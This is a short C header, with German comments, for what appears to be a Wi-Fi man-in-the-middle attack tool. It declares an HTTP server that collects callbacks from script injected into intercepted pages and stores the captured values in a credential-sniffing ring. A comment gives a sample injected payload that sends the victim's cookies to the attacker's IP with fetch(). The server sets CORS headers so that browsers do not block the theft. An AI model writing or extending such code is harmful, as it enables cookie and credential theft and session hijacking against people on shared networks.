#pragma once

#include <stdbool.h>

#ifdef __cplusplus
extern "C" {
#endif

struct WlanCredSniff;

/** Startet einen kleinen HTTP-Server auf Port 80 für eingehende
 *  Inject-Callbacks. Aktiv solange die MiTM-Run-Scene läuft.
 *
 *  Endpoint: GET /k=<value>[?...] → pusht einen "LOG"-Eintrag mit <value>
 *  in den übergebenen Cred-Sniff-Ring. <value> wird URL-decoded.
 *  Beispiel: <script>fetch('http://%%MY_IP%%/k=' + cookie)</script>
 *  Antwortet mit "ok" + CORS-Header (damit der Inject-Code auch
 *  cross-origin fetchen kann ohne Browser-Block). */
void wlan_mitm_server_start(struct WlanCredSniff* cs);

/** Stoppt den Server und löst alle Sockets auf. Idempotent. */
void wlan_mitm_server_stop(void);

bool wlan_mitm_server_running(void);

#ifdef __cplusplus
}
#endif
